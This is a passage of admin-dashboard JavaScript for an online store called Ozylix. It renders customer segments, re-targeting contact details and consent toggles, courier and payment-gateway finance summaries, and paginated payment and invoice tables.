  drawDonutChart('custRepeatCanvas', ['New','Returning'], [newCust, repeat], ['#3B7EA6','#547177'], String(list.length));
}

function customersGoToPage(page) {
  const totalPages = Math.max(1, Math.ceil(customersFilteredList.length / CUSTOMERS_PER_PAGE));
  customersPage = Math.min(Math.max(1, page), totalPages);
  renderCustomersPage();
}

function renderCustomersPage() {
  const totalPages = Math.max(1, Math.ceil(customersFilteredList.length / CUSTOMERS_PER_PAGE));
  const start = (customersPage - 1) * CUSTOMERS_PER_PAGE;
  const pageItems = customersFilteredList.slice(start, start + CUSTOMERS_PER_PAGE);

  renderCustomersTable(pageItems);

  const infoEl = document.getElementById('customersPageInfo');
  if (infoEl) {
    const rangeEnd = Math.min(start + CUSTOMERS_PER_PAGE, customersFilteredList.length);
    infoEl.textContent = customersFilteredList.length
      ? `Showing ${start+1}–${rangeEnd} of ${customersFilteredList.length} customers`
      : 'No customers match these filters';
  }
  document.getElementById('customersPageLabel').textContent = `Page ${customersPage} of ${totalPages}`;
  document.getElementById('customersPrevBtn').disabled = customersPage <= 1;
  document.getElementById('customersNextBtn').disabled = customersPage >= totalPages;
}

function renderCustomersTable(list) {
  // Aug 2026: re-targeting segments & contact channels. `segment` is filled by
  // loadCustomers when the insights pass completes; until then we fall back to
  // a rough client-side label so the column is never empty.
  const segChip = seg => {
    if (!seg) return '';
    const style = {
      new:'background:rgba(59,126,166,0.14);color:#2C6E94;border-color:rgba(59,126,166,0.35)',
      repeat:'background:rgba(74,138,40,0.12);color:var(--green-text);border-color:rgba(74,138,40,0.35)',
      loyal:'background:rgba(169,122,30,0.12);color:var(--gold-text);border-color:rgba(169,122,30,0.4)',
      vip:'background:linear-gradient(135deg,rgba(169,122,30,0.22),rgba(194,67,79,0.18));color:#7A5410;border-color:rgba(169,122,30,0.55)',
      dormant:'background:rgba(91,102,92,0.14);color:#5B665C;border-color:rgba(91,102,92,0.35)',
      churned:'background:var(--red-soft);color:var(--red);border-color:rgba(194,67,79,0.35)',
    }[seg] || 'background:var(--surface2);color:var(--text3);border-color:var(--border)';
    return `<span style="display:inline-block;padding:2px 8px;border-radius:999px;border:1px solid;font-size:0.66rem;font-weight:700;text-transform:capitalize;white-space:nowrap;${style}">${seg}</span>`;
  };
  document.getElementById('customersTbody').innerHTML = list.length ? list.map(c => `
    <tr style="cursor:pointer;" onclick="openCustomerInsight(${c.id})">
      <td>
        <div style="display:flex;align-items:center;gap:10px;">
          <div style="width:32px;height:32px;border-radius:50%;background:var(--green-glow);display:flex;align-items:center;justify-content:center;font-size:0.85rem;font-weight:700;color:var(--green-text);flex-shrink:0;">${esc((c.name||'?')[0].toUpperCase())}</div>
          <span style="font-size:0.83rem;font-weight:500;">${esc(c.name)||'-'}</span>
        </div>
      </td>
      <td style="font-size:0.78rem;">${esc(c.email)||'-'}</td>
      <td style="font-family:var(--mono);font-size:0.75rem;">
        ${esc(c.phone)||'-'}
        <span style="display:inline-block;margin-left:4px;vertical-align:middle;font-size:0.7rem;" title="Re-target channels">${c.email?'✉️':''}${c.phone?' 📱':''}</span>
      </td>
      <td style="font-size:0.78rem;">${esc(c.city)||'-'}</td>
      <td style="font-family:var(--mono);">${c.total_orders||0}</td>
      <td style="color:var(--green-text);font-weight:600;">₹${fmtNum(c.total_spent||0)}</td>
      <td style="white-space:nowrap;">${c.segment ? segChip(c.segment) : segChip(clientSeg(c))}</td>
      <td style="font-size:0.72rem;color:var(--text3);">${fmtDate(c.created_at)}</td>
      <td style="text-align:right;white-space:nowrap">
        <button class="btn btn-secondary btn-sm btn-icon" style="margin-right:4px" title="Customer 360° — full profile" onclick="event.stopPropagation(); window.az360Open(${c.id})">👁️</button>
        <button class="btn btn-danger btn-sm btn-icon" title="Soft-delete customer (password required)" onclick="event.stopPropagation(); deleteCustomer(${c.id})">🗑️</button>
      </td>
    </tr>
  `).join('') : '<tr><td colspan="9"><div class="empty-state"><div class="empty-ico">👥</div><div class="empty-msg">No customers found</div></div></td></tr>';
}

// ── Customer insight drawer (Aug 2026: re-targeting) ──────────────────
async function openCustomerInsight(id) {
  const drawer = document.getElementById('custDrawer');
  const overlay = document.getElementById('custDrawerOverlay');
  const title = document.getElementById('custDrawerTitle');
  const sub = document.getElementById('custDrawerSub');
  const body = document.getElementById('custDrawerBody');
  const c = allCustomers.find(x => x.id === id);
  if (!c) return;
  title.textContent = c.name || 'Customer';
  sub.textContent = 'Re-targeting insights & contact channels';
  body.innerHTML = '<div class="empty-state loading-dots">Loading insights</div>';
  drawer.classList.add('open');
  overlay.classList.add('open');

  let ins = c._insight || null;
  if (!ins) {
    try { const r = await apiFetch('/api/admin/customers/' + id + '/insights'); ins = (await r.json()).data || null; } catch(e) { ins = null; }
  }
  if (!ins) {
    body.innerHTML = '<div class="empty-state"><div class="empty-ico">⚠️</div><div class="empty-msg">Insights unavailable — click Refresh on the Customers page.</div></div>';
    return;
  }
  c._insight = ins; c.segment = ins.segment || clientSeg(c);

  const segStyle = {new:'rgba(59,126,166,0.14)|#2C6E94|rgba(59,126,166,0.35)',repeat:'rgba(74,138,40,0.12)|var(--green-text)|rgba(74,138,40,0.35)',loyal:'rgba(169,122,30,0.12)|var(--gold-text)|rgba(169,122,30,0.4)',vip:'rgba(169,122,30,0.22)|#7A5410|rgba(169,122,30,0.55)',dormant:'rgba(91,102,92,0.14)|#5B665C|rgba(91,102,92,0.35)',churned:'var(--red-soft)|var(--red)|rgba(194,67,79,0.35)'};
  const [bg,fg,bc] = (segStyle[ins.segment]||'var(--surface2)|var(--text3)|var(--border)').split('|');

  const copyable = (label, value, tone) => value
    ? `<div class="info-row" style="background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:10px 12px;margin-bottom:10px;display:flex;align-items:center;justify-content:space-between;gap:10px;">
        <div><div style="font-size:0.65rem;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:0.5px;">${label}</div>
             <div style="font-size:0.85rem;color:var(--text);font-weight:500;margin-top:2px;word-break:break-all;${tone||''}">${esc(value)}</div></div>
        <button class="btn btn-secondary btn-sm" style="flex-shrink:0;" onclick="navigator.clipboard.writeText(${JSON.stringify(String(value))});toast('Copied','success')">📋 Copy</button>
       </div>` : '';

  const kpi = (label, value, ico) => `<div style="flex:1;min-width:108px;background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:9px 10px;text-align:center;">
    <div style="font-size:0.58rem;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:0.3px;line-height:1.3;">${ico} ${label}</div>
    <div style="font-family:var(--display);font-size:1rem;font-weight:800;color:var(--green-text);margin-top:3px;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">${value}</div></div>`;

  body.innerHTML = `
    <div style="display:flex;align-items:center;gap:12px;margin-bottom:14px;">
      <div style="width:46px;height:46px;border-radius:50%;background:var(--green-glow);display:flex;align-items:center;justify-content:center;font-size:1.1rem;font-weight:700;color:var(--green-text);flex-shrink:0;">${esc((c.name||'?')[0].toUpperCase())}</div>
      <div>
        <div style="font-size:0.95rem;font-weight:700;color:var(--text);">${esc(c.name)||'-'}</div>
        <div style="font-size:0.72rem;color:var(--text3);">Customer since ${fmtDate(c.created_at)}${ins.city? ' · ' + esc(ins.city):''}</div>
      </div>
      <div style="margin-left:auto;"><span style="display:inline-block;padding:4px 12px;border-radius:999px;border:1px solid ${bc};background:${bg};color:${fg};font-size:0.75rem;font-weight:700;text-transform:capitalize;">${ins.segment}</span></div>
    </div>
    <div style="display:flex;gap:8px;margin-bottom:14px;flex-wrap:wrap;">
      ${kpi('Orders', ins.total_orders || 0, '📦')}
      ${kpi('Lifetime Value', '₹' + fmtNum(ins.total_spent||0), '💰')}
      ${kpi('Avg / Order', '₹' + fmtNum(ins.avg_order_value||0), '🧾')}
      ${kpi('Days Since Last Order', ins.days_since_last_order == null ? '–' : ins.days_since_last_order, '⏳')}
    </div>
    <h4 style="font-size:0.72rem;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:0.6px;margin:4px 0 8px;">Contact for re-targeting</h4>
    ${copyable('Email', ins.email)}
    ${copyable('WhatsApp / Phone', ins.phone)}
    ${ins.phone ? `<div style="margin-bottom:12px;"><a class="btn btn-primary btn-sm" href="https://wa.me/91${String(ins.phone).replace(/^0+|\D/g,'')}?text=${encodeURIComponent('Hello ' + (c.name||'') + ', this is Ozylix — a special offer just for you!')}" target="_blank" rel="noopener">💬 Open WhatsApp chat</a></div>` : '<div style="font-size:0.7rem;color:var(--text3);margin-bottom:12px;">No phone on file — ask at checkout or update below.</div>'}
    <h4 style="font-size:0.72rem;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:0.6px;margin:4px 0 8px;">Marketing consent</h4>
    <div style="display:flex;gap:10px;margin-bottom:14px;">
      <label style="flex:1;display:flex;align-items:center;gap:8px;background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:10px 12px;cursor:pointer;">
        <input type="checkbox" id="consentEmail" ${c.marketing_email !== false ? 'checked':''} onchange="updateCustomerConsent(${c.id},'marketing_email',this.checked)">
        <span style="font-size:0.8rem;">✉️ Email campaigns</span></label>
      <label style="flex:1;display:flex;align-items:center;gap:8px;background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:10px 12px;cursor:pointer;">
        <input type="checkbox" id="consentWhatsapp" ${c.marketing_whatsapp !== false ? 'checked':''} onchange="updateCustomerConsent(${c.id},'marketing_whatsapp',this.checked)">
        <span style="font-size:0.8rem;">📱 WhatsApp messages</span></label>
    </div>
    <h4 style="font-size:0.72rem;font-weight:700;color:var(--text3);text-transform:uppercase;letter-spacing:0.6px;margin:4px 0 8px;">Last products bought — re-target on these</h4>
    <div style="display:flex;flex-wrap:wrap;gap:6px;margin-bottom:14px;">${(ins.last_products||[]).length
      ? (ins.last_products||[]).map(p => `<span style="background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:5px 10px;font-size:0.75rem;">${esc(p.name)} <span style="color:var(--text3);">×${p.times}</span></span>`).join('')
      : '<span style="font-size:0.75rem;color:var(--text3);">No paid order history to derive products from.</span>'}</div>
    <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;margin-bottom:6px;">
      <div style="background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:10px 12px;font-size:0.75rem;"><div style="color:var(--text3);font-size:0.62rem;font-weight:700;text-transform:uppercase;">First order</div><div style="margin-top:2px;">${fmtDate(ins.first_order_at)}</div></div>
      <div style="background:var(--bg2);border:1px solid var(--border);border-radius:10px;padding:10px 12px;font-size:0.75rem;"><div style="color:var(--text3);font-size:0.62rem;font-weight:700;text-transform:uppercase;">Payment style</div><div style="margin-top:2px;">${(ins.payment?.preference||'-').toUpperCase()}${ins.payment ? ' (' + (ins.payment.cod_count||0) + ' COD · ' + (ins.payment.prepaid_count||0) + ' prepaid)' : ''}</div></div>
    </div>`;
  renderCustomersTable(customersFilteredList); // refresh segment chip
}

function closeCustomerInsight() {
  document.getElementById('custDrawer').classList.remove('open');
  document.getElementById('custDrawerOverlay').classList.remove('open');
}

async function updateCustomerConsent(id, key, val) {
  try {
    const r = await apiFetch('/api/admin/customers/' + id + '/consent', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ [key]: val }) });
    if (r.ok) { const c = allCustomers.find(x => x.id === id); if (c) c[key] = val; toast('Consent updated', 'success'); }
    else { const d = await r.json().catch(() => ({})); toast(d.error || 'Could not save consent', 'error'); }
  } catch(e) { toast('Network error', 'error'); }
}

// ── Re-targeting contact list export (Aug 2026) ──────────────────────
// Pulls the server-computed re-targeting list (with consent flags) and
// downloads it as a CSV ready for Meta/Google customer-list uploads.
async function exportRetargetingList() {
  try {
    toast('Building re-targeting list…');
    const r = await apiFetch('/api/admin/customers-export?format=csv');
    if (!r.ok) { toast('Export failed — admin access required', 'error'); return; }
    const text = await r.text();
    const blob = new Blob([text], { type: 'text/csv;charset=utf-8;' });
    const a = document.createElement('a');
    a.href = URL.createObjectURL(blob);
    a.download = 'Ozylix-retarget-list-' + new Date().toISOString().slice(0,10) + '.csv';
    a.click();
    URL.revokeObjectURL(a.href);
    toast('✅ Re-targeting list downloaded');
  } catch(e) { toast('Export error: ' + e.message, 'error'); }
}

// ═══════════════════════════════════════════════
// PAYMENTS
// ═══════════════════════════════════════════════
const PAYMENTS_PER_PAGE = 50;
let paymentsPage = 1;
let paymentsDateMode = 'all';
let paymentsFilteredList = [];


// ═══════════════════════════════════════════════════════════════
// FINANCE DASHBOARD — feeds from GET /api/admin/finance (owner/admin)
// ═══════════════════════════════════════════════════════════════
let financeRange = 90; // days
function setFinanceRange(days, btn) {
  financeRange = days;
  document.querySelectorAll('[id^=finChip]').forEach(b => b.classList.remove('active'));
  btn.classList.add('active');
  loadFinance(true);
}
const FIN_IN = v => (v == null || isNaN(v) || v === null || v === undefined) ? '—' :
  '₹' + Math.round(Number(v)).toLocaleString('en-IN');
const FIN_IN2 = v => (v == null || isNaN(v)) ? '—' :
  '₹' + Number(v).toLocaleString('en-IN', { maximumFractionDigits: 2 });

function finMiniCard(title, value, sub, noteCls) {
  return `<div style="flex:1;min-width:120px;">
    <div style="font-size:0.7rem;color:var(--text3);text-transform:uppercase;letter-spacing:.5px;">${title}</div>
    <div style="font-family:var(--display);font-size:1.35rem;font-weight:800;margin-top:4px;">${FIN_IN(value)}</div>
    ${sub ? `<div style="font-size:0.75rem;margin-top:3px;color:${noteCls || 'var(--text3)'};">${sub}</div>` : ''}
  </div>`;
}

async function loadFinance(force = false) {
  const t0 = Date.now();
  const el = id => document.getElementById(id);
  // lazy render of kpi skeletons handled by the page's static .skel divs
  let data;
  try {
    const r = await apiFetch(`/api/admin/finance?days=${financeRange}`);
    data = await r.json();
  } catch (e) {
    console.error('[loadFinance]', e);
    el('financeKpis').innerHTML = `<div class="card" style="grid-column:1/-1"><div class="empty-state"><div class="empty-ico">⚠️</div><div class="empty-msg">Finance data unavailable — ${e.message}. Click Refresh.</div></div></div>`;
    return;
  }
  if (!data || !data.sources) { el('financeKpis').innerHTML = '<div class="card">No data</div>'; return; }
  const { sources, totals, timeline, courierSync } = data;
  const sr = sources.shiprocket, dl = sources.delhivery, gw = sources.gateway;

  // ── API status strip ──
  const syncAge = courierSync && courierSync.lastOkAt ? Math.round((t0 - new Date(courierSync.lastOkAt)) / 60000) : null;
  el('financeApiStatus').innerHTML = [
    ['🚚 Shiprocket', sr.status],
    ['📮 Delhivery', dl.status],
    ['💳 Cashfree', gw.status],
    ['🔄 Courier sync', syncAge == null ? 'never' : (syncAge < 2 ? 'just now' : syncAge + ' min ago')],
  ].map(([n, s]) => `<span style="font-size:0.74rem;padding:4px 10px;border-radius:20px;background:var(--surface);border:1px solid var(--border);color:${s === 'connected' || s === 'just now' ? 'var(--green-text)' : s === 'not_configured' ? 'var(--text3)' : 'var(--danger)'};">${n}: ${s === 'just now' ? 'synced' : s}</span>`).join('');

  // ── KPI row ──
  el('financeKpis').innerHTML = [
    `<div class="oz-kpi-card"><div class="oz-kpi-label"><span class="oz-kpi-icon">₹</span>Collected in window</div><div class="oz-kpi-value">${FIN_IN(totals.collected)}</div><div class="oz-kpi-meta up">COD ${FIN_IN(totals.codCollected)} · online ${FIN_IN(totals.onlinePaid)}</div></div>`,
    `<div class="oz-kpi-card"><div class="oz-kpi-label"><span class="oz-kpi-icon">◷</span>With couriers, pending</div><div class="oz-kpi-value">${FIN_IN(totals.courierPending)}</div><div class="oz-kpi-meta warn">Collected, not yet remitted</div></div>`,
    `<div class="oz-kpi-card"><div class="oz-kpi-label"><span class="oz-kpi-icon">−</span>Platform + gateway charges</div><div class="oz-kpi-value">${FIN_IN(totals.charges)}</div><div class="oz-kpi-meta down">Deducted before bank settlement</div></div>`,
    `<div class="oz-kpi-card"><div class="oz-kpi-label"><span class="oz-kpi-icon">✓</span>Realizable revenue</div><div class="oz-kpi-value">${FIN_IN(totals.netRealizable)}</div><div class="oz-kpi-meta up">Collected minus charges</div></div>`,
  ].join('');

  // ── Shiprocket card ──
  el('finSrStatus').textContent = sr.status === 'connected' ? 'Live' : sr.status;
  el('finSrBody').innerHTML = `<div style="display:grid;grid-template-columns:1fr 1fr;gap:14px 24px;">
    ${finMiniCard('COD pending with SR', sr.pending, 'what the platform still owes', 'var(--amber-text)')}
    ${finMiniCard('COD remitted (banked)', sr.remitted, 'already transferred by the platform')}
    ${finMiniCard('Platform charges deducted', sr.charges, 'forward shipping / RTO taken from remittance', 'var(--danger)')}
    ${finMiniCard('SR-collected orders', sr.collectedOrders, 'marked COD-Collected in our books')}
  </div>${sr.raw && sr.raw.summary && Object.keys(sr.raw.summary).length === 0 ? '<div style="margin-top:10px;font-size:0.72rem;color:var(--text3);">Note: this Shiprocket plan does not expose the COD summary figures via API — remittance detail is in shiprocket.in → Billing → COD Remittance.</div>' : ''}`;
  const srTx = el('finSrTxns');
  srTx.innerHTML = (sr.collectedWhen || []).length ?
    sr.collectedWhen.slice(0, 30).map(t => `<div style="display:flex;justify-content:space-between;padding:5px 0;border-bottom:1px solid var(--border);"><span style="color:var(--text3);max-width:65%;overflow:hidden;text-overflow:ellipsis;">${t.label || t.date || '—'}</span><span style="font-weight:700;">${FIN_IN2(t.amount)}</span></div>`).join('') :
    '<div style="color:var(--text3);padding:12px 0;">No COD transactions returned by the Shiprocket statement API in this window.</div>';

  // ── Delhivery card ──
  el('finDlStatus').textContent = dl.status === 'connected' ? 'Live' : dl.status;
  el('finDlBody').innerHTML = `<div style="display:grid;grid-template-columns:1fr 1fr;gap:14px 24px;">
    ${finMiniCard('COD collected (Delhivery)', dl.collected, dl.collectedOrders + ' orders confirmed', 'var(--green-text)')}
    ${finMiniCard('COD pending (Delhivery)', dl.pending, dl.pendingOrders + ' orders awaiting remittance', 'var(--amber-text)')}
    ${finMiniCard('Shipping fees paid to DL', dl.chargesEstimated, 'estimated charges for pending+collected')}
  </div><div style="margin-top:10px;font-size:0.72rem;color:var(--text3);">${dl.note}</div>`;
  el('finDlTxns').innerHTML = (dl.collectedWhen || []).length ?
    dl.collectedWhen.slice(0, 30).map(t => `<div style="display:flex;justify-content:space-between;padding:5px 0;border-bottom:1px solid var(--border);"><span style="color:var(--text3);">${(t.date || '').slice(0, 10)}</span><span style="font-weight:700;">${FIN_IN2(t.amount)}</span></div>`).join('') :
    '<div style="color:var(--text3);padding:12px 0;">No Delhivery COD orders confirmed collected in this window — collected COD flips to "COD - Collected" automatically via the courier sync.</div>';

  // ── Gateway card ──
  el('finCfStatus').textContent = gw.status === 'connected' ? 'Live' : gw.status;
  const feeLeak = gw.gross - gw.netSettled;
  el('finCfBody').innerHTML = `<div style="display:grid;grid-template-columns:1fr 1fr 1fr;gap:14px 24px;">
    ${finMiniCard('Online orders paid', gw.collected, 'booked in our orders')}
    ${finMiniCard('Settlements net (banked)', gw.netSettled, 'after gateway fees')}
    ${finMiniCard('Gateway fees', gw.fees, 'leakage: ' + (gw.gross ? Math.round(feeLeak / gw.gross * 100 * 10) / 10 + '%' : '—'), 'var(--danger)')}
  </div>`;
  const tbody = el('finSettleTbody');
  tbody.innerHTML = (gw.settlements || []).length ?
    gw.settlements.map(s => `<tr><td style="font-family:monospace;font-size:0.78rem;">${(s.id || '').slice(0, 22)}</td><td style="font-weight:700;">${FIN_IN(s.amount)}</td><td style="color:var(--danger);">${FIN_IN(s.fee)}</td><td>${FIN_IN(s.gross)}</td><td>${s.status || '—'}</td><td style="font-family:monospace;font-size:0.75rem;">${s.bank_ref || '—'}</td><td style="color:var(--text3);">${(s.date || '').slice(0, 16).replace('T', ' ')}</td></tr>`).join('') :
    `<tr><td colspan="7" style="text-align:center;color:var(--text3);">No Cashfree settlements in this window — prepaid orders settle to the linked bank account (check Cashfree dashboard for the exact credit date).</td></tr>`;

  // ── Timeline chart ──
  el('finTimeRange').textContent = timeline.length ? `${timeline[0].month} → ${timeline[timeline.length - 1].month}` : '—';
  if (timeline.length) {
    const canvas = el('financeTimelineCanvas');
    if (!canvas || !canvas.getContext) return;
    const ctx = canvas.getContext('2d');
    const dpr = window.devicePixelRatio || 1;
    canvas.width = canvas.clientWidth * dpr;
    canvas.height = canvas.clientHeight * dpr;
    ctx.scale(dpr, dpr);
    ctx.clearRect(0, 0, canvas.clientWidth, canvas.clientHeight);
    const labels = timeline.map(t => t.month);
    const groups = ['shiprocket', 'delhivery', 'gateway'];
    const colors = { shiprocket: '#4a8a28', delhivery: '#3B7EA6', gateway: '#8F6417' };
    const max = Math.max(1, ...timeline.flatMap(t => groups.map(g => t[g])));
    const padL = 54, padR = 16, padT = 10, padB = 30;
    const w = canvas.clientWidth - padL - padR, h = canvas.clientHeight - padT - padB;
    const bw = w / labels.length;
    // gridlines
    ctx.strokeStyle = 'var(--border)'.includes('var') ? '#e6e9ec' : 'var(--border)';
    ctx.fillStyle = '#9aa5ad';
    ctx.font = '11px inherit';
    ctx.lineWidth = 1;
    for (let i = 0; i <= 4; i++) {
      const y = padT + (h / 4) * i;
      ctx.beginPath(); ctx.moveTo(padL, y); ctx.lineTo(padL + w, y); ctx.stroke();
      const v = max - (max / 4) * i;
      ctx.fillText(v >= 1000 ? (v / 1000).toFixed(v % 1000 ? 1 : 0) + 'k' : Math.round(v).toString(), 4, y + 4);
    }
    for (let mi = 0; mi < labels.length; mi++) {
      const x = padL + bw * mi + bw / 2;
      ctx.save(); ctx.translate(x, padT + h + 6); ctx.rotate(-0.4);
      ctx.fillText(labels[mi], 0, 0); ctx.restore();
      const total = groups.reduce((s, g) => s + timeline[mi][g], 0);
      let y0 = padT + h;
      for (const g of groups) {
        const v = timeline[mi][g];
        if (!v) continue;
        const bh = (v / max) * h;
        y0 -= bh;
        ctx.fillStyle = colors[g];
        ctx.fillRect(padL + bw * mi + bw * 0.15, y0, bw * 0.7, bh);
        if (bh > 12) { ctx.fillStyle = '#fff'; ctx.font = 'bold 10px inherit'; ctx.fillText(FIN_IN(v), padL + bw * mi + 2, y0 + bh - 4); ctx.font = '11px inherit'; }
      }
    }
  }
  console.log('[finance] loaded in', Date.now() - t0, 'ms');
}

async function loadPayments() {
  if(!allOrders.length) { const r = await apiFetch('/api/admin/orders?limit=2000'); allOrders = (await r.json()).data||[]; }
  allPayments = allOrders;
  populatePaymentYearFilter();
  filterPayments();
}

function populatePaymentYearFilter() {
  const sel = document.getElementById('payYearFilter');
  if (!sel || sel.options.length > 1) return;
  const years = new Set(allOrders.map(o => (o.created_at||'').slice(0,4)).filter(Boolean));
  years.add(String(new Date().getFullYear()));
  sel.innerHTML = '<option value="">Any Year</option>' +
    [...years].sort().reverse().map(y => `<option value="${y}">${y}</option>`).join('');
}

function setPaymentDateRange(days, btn) {
  paymentsDateMode = days;
  document.querySelectorAll('[id^=payDateChip]').forEach(b=>b.classList.remove('active'));
  btn.classList.add('active');
  document.getElementById('payMonthFilter').value = '';
  document.getElementById('payYearFilter').value = '';
  document.getElementById('payDateStart').value = '';
  document.getElementById('payDateEnd').value = '';
  paymentsPage = 1;
  filterPayments();
}

function setPaymentMonthYear() {
  paymentsDateMode = 'month';
  document.querySelectorAll('[id^=payDateChip]').forEach(b=>b.classList.remove('active'));
  document.getElementById('payDateStart').value = '';
  document.getElementById('payDateEnd').value = '';
  paymentsPage = 1;
  filterPayments();
}

function setPaymentCustomRange() {
  paymentsDateMode = 'custom';
  document.querySelectorAll('[id^=payDateChip]').forEach(b=>b.classList.remove('active'));
  document.getElementById('payMonthFilter').value = '';
  document.getElementById('payYearFilter').value = '';
  paymentsPage = 1;
  filterPayments();
}

function clearPaymentDateFilters() {
  paymentsDateMode = 'all';
  document.querySelectorAll('[id^=payDateChip]').forEach(b=>b.classList.remove('active'));
  document.getElementById('payDateChipAll').classList.add('active');
  document.getElementById('payMonthFilter').value = '';
  document.getElementById('payYearFilter').value = '';
  document.getElementById('payDateStart').value = '';
  document.getElementById('payDateEnd').value = '';
  paymentsPage = 1;
  filterPayments();
}

function filterPayments() {
  const f = document.getElementById('payFilterStatus').value;
  let list = allOrders;

  if (f) list = list.filter(o => o.payment_status === f);

  if (paymentsDateMode === 'today') {
    const todayStr = new Date().toISOString().split('T')[0];
    list = list.filter(o => (o.created_at||'').startsWith(todayStr));
  } else if (paymentsDateMode === 7 || paymentsDateMode === 30 || paymentsDateMode === 90) {
    const cutoff = Date.now() - paymentsDateMode * 86400000;
    list = list.filter(o => new Date(o.created_at).getTime() >= cutoff);
  } else if (paymentsDateMode === 'month') {
    const m = document.getElementById('payMonthFilter').value;
    const y = document.getElementById('payYearFilter').value;
    if (m) list = list.filter(o => (o.created_at||'').slice(5,7) === m.padStart(2,'0'));
    if (y) list = list.filter(o => (o.created_at||'').slice(0,4) === y);
  } else if (paymentsDateMode === 'custom') {
    const start = document.getElementById('payDateStart').value;
    const end   = document.getElementById('payDateEnd').value;
    if (start) list = list.filter(o => o.created_at >= start);
    if (end)   list = list.filter(o => o.created_at <= end + 'T23:59:59');
  }

  paymentsFilteredList = list;
  const totalPages = Math.max(1, Math.ceil(list.length / PAYMENTS_PER_PAGE));
  if (paymentsPage > totalPages) paymentsPage = 1;

  // KPIs (based on filtered range)
  const paid = list.filter(o=>o.payment_status==='Paid');
  const cod  = list.filter(o=>(o.payment_status||'').includes('COD'));
  const rev  = paid.reduce((s,o)=>s+parseFloat(o.total||0),0);
  document.getElementById('payKpis').innerHTML = `
    <div class="kpi"><div class="kpi-label">Online Paid (range)</div><div class="kpi-val">₹${fmtNum(rev)}</div><div class="kpi-change up">✅ ${paid.length} orders</div></div>
    <div class="kpi"><div class="kpi-label">COD Pending (range)</div><div class="kpi-val">${cod.length}</div><div class="kpi-change" style="color:var(--gold-text)">⏳ Orders</div></div>
    <div class="kpi"><div class="kpi-label">Total Orders (range)</div><div class="kpi-val">${list.length}</div><span class="kpi-ico">📦</span></div>
  `;

  renderPaymentTrendChart(list);
  renderPaymentMethodChart(list);

  renderPaymentsPage();
}

function renderPaymentTrendChart(list) {
  const days = paymentsDateMode==='today'?1 : paymentsDateMode===90?90 : paymentsDateMode===30?30 : paymentsDateMode===7?7 : 30;
  const buckets = Array.from({length:days}, (_,i) => {
    const d = new Date(); d.setDate(d.getDate() - (days-1-i));
    return { label: d.getDate()+'/'+(d.getMonth()+1), date: d.toISOString().split('T')[0], rev: 0 };
  });
  list.filter(o=>['Paid','Paid - COD Collected'].includes(o.payment_status)||o.payment_status==='SUCCESS').forEach(o => {
    const day = (o.created_at||'').split('T')[0];
    const b = buckets.find(b=>b.date===day);
    if (b) b.rev += parseFloat(o.total||0);
  });
  drawAreaChart('payTrendCanvas', buckets.map(b=>b.label), buckets.map(b=>b.rev), '#547177');
}

function renderPaymentMethodChart(list) {
  if (typeof drawDonutChart !== 'function') return;
  const modes = {};
  list.forEach(o => { const m = o.payment_mode || 'UPI'; modes[m] = (modes[m]||0)+1; });
  const colors = ['#547177','#3B7EA6','#8F6417','#8B5CF6','#EF4444'];
  const entries = Object.entries(modes);
  drawDonutChart('payMethodSplitCanvas', entries.map(e=>e[0]), entries.map(e=>e[1]), colors, String(list.length));
}

function paymentsGoToPage(page) {
  const totalPages = Math.max(1, Math.ceil(paymentsFilteredList.length / PAYMENTS_PER_PAGE));
  paymentsPage = Math.min(Math.max(1, page), totalPages);
  renderPaymentsPage();
}

function renderPaymentsPage() {
  const totalPages = Math.max(1, Math.ceil(paymentsFilteredList.length / PAYMENTS_PER_PAGE));
  const start = (paymentsPage - 1) * PAYMENTS_PER_PAGE;
  const pageItems = paymentsFilteredList.slice(start, start + PAYMENTS_PER_PAGE);

  renderPaymentsTable(pageItems);

  const infoEl = document.getElementById('paymentsPageInfo');
  if (infoEl) {
    const rangeEnd = Math.min(start + PAYMENTS_PER_PAGE, paymentsFilteredList.length);
    infoEl.textContent = paymentsFilteredList.length
      ? `Showing ${start+1}–${rangeEnd} of ${paymentsFilteredList.length} payments`
      : 'No payments match these filters';
  }
  document.getElementById('paymentsPageLabel').textContent = `Page ${paymentsPage} of ${totalPages}`;
  document.getElementById('paymentsPrevBtn').disabled = paymentsPage <= 1;
  document.getElementById('paymentsNextBtn').disabled = paymentsPage >= totalPages;
}

function renderPaymentsTable(list) {
  document.getElementById('paymentsTbody').innerHTML = list.length ? list.map(o => `
    <tr>
      <td class="td-id">${o.id}</td>
      <td>${esc(o.customer_name)||'-'}</td>
      <td style="font-weight:600;color:var(--green-text);">₹${fmtNum(o.total||0)}</td>
      <td><span class="badge badge-gray">${o.payment_mode||'UPI'}</span></td>
      <td>${payBadge(o.payment_status)}</td>
      <td style="font-size:0.72rem;color:var(--text3);">${fmtDate(o.created_at)}</td>
    </tr>
  `).join('') : '<tr><td colspan="6" class="empty-state">No payments match these filters</td></tr>';
}

// ═══════════════════════════════════════════════
// INVOICES
// ═══════════════════════════════════════════════
const INVOICES_PER_PAGE = 50;
let invoicesPage = 1;
let invoicesDateMode = 'all';
let invoicesFilteredList = [];

async function loadInvoices() {
  if(!allOrders.length) { const r = await apiFetch('/api/admin/orders?limit=2000'); allOrders = (await r.json()).data||[]; }
  populateInvoiceYearFilter();
  filterInvoices();
}

function populateInvoiceYearFilter() {
  const sel = document.getElementById('invYearFilter');
  if (!sel || sel.options.length > 1) return;
  const years = new Set(allOrders.map(o => (o.created_at||'').slice(0,4)).filter(Boolean));
  years.add(String(new Date().getFullYear()));
  sel.innerHTML = '<option value="">Any Year</option>' +
    [...years].sort().reverse().map(y => `<option value="${y}">${y}</option>`).join('');
}

function setInvoiceDateRange(days, btn) {
  invoicesDateMode = days;
  document.querySelectorAll('[id^=invDateChip]').forEach(b=>b.classList.remove('active'));
  btn.classList.add('active');
  document.getElementById('invMonthFilter').value = '';
  document.getElementById('invYearFilter').value = '';
  document.getElementById('invDateStart').value = '';
  document.getElementById('invDateEnd').value = '';
